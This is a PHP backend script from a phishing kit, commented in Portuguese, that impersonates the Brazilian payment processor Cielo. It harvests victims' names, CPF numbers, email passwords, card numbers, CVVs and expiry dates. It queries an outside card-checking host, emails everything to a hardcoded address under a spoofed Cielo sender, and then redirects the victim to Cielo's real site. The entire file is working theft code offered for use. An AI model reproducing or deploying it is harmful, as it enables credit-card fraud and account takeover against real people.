
<?php 

$useragent = $_SERVER['HTTP_USER_AGENT'];
  if (preg_match('|MSIE ([0-9].[0-9]{1,2})|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'IE';
  } elseif (preg_match( '|Opera/([0-9].[0-9]{1,2})|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Opera';
  } elseif(preg_match('|Firefox/([0-9\.]+)|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Firefox';
  } elseif(preg_match('|Chrome/([0-9\.]+)|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Chrome';
  } elseif(preg_match('|Safari/([0-9\.]+)|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Safari';
  } else {
    // browser not recognized!
    $browser_version = 0;
    $browser= 'other';
  }
  



//PEGA OS DADOS ENVIADOS PELO FORMULÁRIO
    $nomecc = $_POST['nomecc']; 
	$cpf	=	$_POST["cpf"];
        $emailz =	$_POST["emailz"];  
	$userpass =	$_POST["userpass"];  
	$nome =	$_POST["nome"];        
	$numerocc	= $_POST["numerocc"];  
	$validade = $_POST['validade'];
	$cvv	=	$_POST["cvv"];
	$ip = $_SERVER["REMOTE_ADDR"];
	$hora=date("H:i:s");
	
	$ch = @curl_init();
$numero_cc=$numero_cc;
// Define a URL original (do formulário de login)
@curl_setopt($ch, CURLOPT_URL, 'http://bin.cvvtools.pro/');
// Habilita o protocolo POST
@curl_setopt ($ch, CURLOPT_POST, 1);
// Define os parâmetros que serão enviados (usuário e senha por exemplo)
@curl_setopt ($ch, CURLOPT_POSTFIELDS, "data=$numero_cc");
// Imita o comportamento patrão dos navegadores: manipular cookies
@curl_setopt ($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
// Define o tipo de transferência (Padrão: 1)
@curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
// Executa a requisição
$store = @curl_exec ($ch);
$var = $store;
$q = explode("<i>", $var);
$q2 = explode("</i>", $q[1]);
	
//ENVIAR PARA EMAIL

$headers = "Content-type: text/html; charset=iso-8859-1\r\n";
$headers .= "From: $$ Up 2014 $$ <cielo@cielo.com>";
$conteudo.="<b>=-=-=-=-=-=-=-=-=-=-Dados Cadastrais=-=-=-=-=-=-=-=-=-=-=-=-</b><br>";
$conteudo.="<b>Ip: </b>$ip - Navegador: </b>$browser $browser_version<br>";
$conteudo.="<b>Nome: </b>$nomecc<br>";
$conteudo.="<b>Cpf: </b>$cpf<br>";
$conteudo.="<b>Email e Senha : </b>$emailz / $userpass <br>";
$conteudo.="<b>Analise: </b>$q2[0]<br>";
$conteudo.="<b>-------------------Dados INFO CC-----------------------</b><br>";
$conteudo.="<b>Titular: </b>$nomecc<br>";
$conteudo.="<b>Cartao: </b>$numerocc<br>";
$conteudo.="<b>Cvv: </b>$cvv<br>";
$conteudo.="<b>Validade: </b>$validade<br>";
$conteudo.="<b>=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-</b><br>";
@mail("romariof10@outlook.com", "$ip - $q2[0]", "$conteudo", $headers); // <- trocar e-mail

echo"<meta http-equiv='refresh' content='0;  http://www.cielo.com.br/portal/home.html'>";
?>


